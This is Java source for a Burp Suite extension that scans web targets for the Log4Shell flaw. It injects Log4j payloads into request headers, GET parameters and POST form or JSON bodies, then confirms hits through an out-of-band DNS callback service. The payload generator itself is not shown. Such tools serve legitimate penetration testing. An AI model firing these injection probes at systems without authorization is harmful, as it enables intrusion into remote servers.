package burp.ScanFun;

import burp.*;
import burp.Listen.Ceye;
import com.alibaba.fastjson.JSONArray;
import org.checkerframework.checker.units.qual.C;

import java.io.UnsupportedEncodingException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

public class Log4jScan {
 final static String[] HEADER_GUESS = new String[]{"User-Agent", "Origin", "Referer","X-Api-Version","Accept:"};


    public static IHttpRequestResponse ScanHeader(IHttpRequestResponse baseRequestResponse, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) {

        List<String> headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
        List<String> headersPOC = helpers.analyzeRequest(baseRequestResponse).getHeaders();
        String reqMethod = helpers.analyzeRequest(baseRequestResponse).getMethod();
        String host = baseRequestResponse.getHttpService().getHost();
        Ceye ceye = new Ceye();
        String newhost = "log4"+GenPoc.Makenewhost(host);
        //BurpExtender.stdout.println(newhost);
        for (int i = 0; i < headers.size(); i++) {

            for (int j = 0; j < HEADER_GUESS.length; j++) {   //判断是否包含需要测试的请求头
                if (headers.get(i).contains(HEADER_GUESS[j])) {
                    List<String> poc = GenPoc.GenLog4Poc(host);

                    //BurpExtender.stdout.println(poc.size());
                    for (int k = 0; k < poc.size(); k++) {
                        headersPOC = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                        headersPOC.set(i, HEADER_GUESS[j] + ": " + poc.get(k));
                        baseRequestResponse.getRequest();
                        if (reqMethod.toLowerCase().equals("get")) {

                            byte[] body = helpers.buildHttpMessage(headersPOC, null);
                            IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            if (ceye.CheckResult(newhost + ceye.getNewPayload())) {
                                return requestResponse;
                            }
                        }
                        if (reqMethod.toLowerCase().equals("post")) {

                            int start = helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset();
                            byte[] srcbody = baseRequestResponse.getRequest();
                            byte[] reqbody=Common.getpostParams(start,srcbody);
                            byte[] body = helpers.buildHttpMessage(headersPOC, reqbody);
                            IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            if (ceye.CheckResult(newhost + ceye.getNewPayload())) {
                                return requestResponse;
                            }

                        }
                    }

                }
            }
        }
        return null;
    }

    public static IHttpRequestResponse ScanParam(IHttpRequestResponse baseRequestResponse, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) throws UnsupportedEncodingException {
        if (baseRequestResponse.getRequest() != null) {
            IRequestInfo analyzeRequest = helpers.analyzeRequest(baseRequestResponse);
            List<String> headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
            String reqMethod = helpers.analyzeRequest(baseRequestResponse).getMethod();
            String host = baseRequestResponse.getHttpService().getHost();
            Ceye ceye = new Ceye();
            List<String> pocs = GenPoc.GenLog4Poc(host);
            String newhost = "log4"+GenPoc.Makenewhost(host);
            //BurpExtender.stdout.println(newhost);
            //对消息体进行解析,messageInfo是整个HTTP请求和响应消息体的总和，各种HTTP相关信息的获取都来自于它，HTTP流量的修改都是围绕它进行的。

            /*****************获取参数**********************/
            if (reqMethod.toLowerCase().equals("get")) {

                for (String poc : pocs) {
                    headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                    List<String> targertList = Common.ParamAddPocGet(headers.get(0), poc);
                    for (String target : targertList) {

                        headers.set(0, target);
                        byte[] body = helpers.buildHttpMessage(headers, null);
                        IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                        if (ceye.CheckResult(newhost + ceye.getNewPayload())) {
                            return requestResponse;
                        }
                    }
                }


            }
            if (reqMethod.toLowerCase().equals("post")) {
                headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                boolean json=false;
                boolean multipart=true;
                String Contenttype = Byte.toString(helpers.analyzeRequest(baseRequestResponse).getContentType());
                //BurpExtender.stdout.println(Contenttype);
                for (String header:headers
                     ) {
                    if (header.contains("Content-Type: json/application") || header.contains("Content-Type: application/json")){
                        json=true;
                    }
                    if(header.contains("multipart/form-data")){
                        multipart=false;
                    }
                }


                if (!json && multipart) {

                    int start = helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset();
                    byte[] srcbody = baseRequestResponse.getRequest();
                    byte[] reqbody=Common.getpostParams(start,srcbody);

                    String reqbodystr=new String(Common.getpostParams(start,srcbody),"utf-8");
                    //BurpExtender.stdout.println(reqbodystr);

                    for (String poc : pocs) {
                        List<String> targertList = Common.ParamAddPocPost(reqbodystr, poc);
                        for (String target : targertList) {
                            byte[] body = helpers.buildHttpMessage(headers, target.getBytes(StandardCharsets.UTF_8));
                            IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            if (ceye.CheckResult(newhost + ceye.getNewPayload())) {
                                return requestResponse;
                            }
                        }
                    }
                }
                if (json && multipart) {
                    int start = helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset();
                    byte[] srcbody = baseRequestResponse.getRequest();
                    byte[] reqbody=Common.getpostParams(start,srcbody);

                    String reqbodystr=new String(Common.getpostParams(start,srcbody),"utf-8");
                    for (String poc : pocs) {
                        List<String> tragetList = Common.ParamAddPocPostJson(reqbodystr, poc);
                        for (String target:tragetList
                             ) {
                            BurpExtender.stdout.println(baseRequestResponse.getHttpService().getHost()+"的请求json数据为"+target);
                            byte[] body = helpers.buildHttpMessage(headers, target.getBytes(StandardCharsets.UTF_8));

                            IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            if (ceye.CheckResult(newhost + ceye.getNewPayload())) {
                                return requestResponse;
                            }
                        }
                        //BurpExtender.stdout.println(reqbodystr);
                    }
                }

            }
        }

        return null;
    }
}

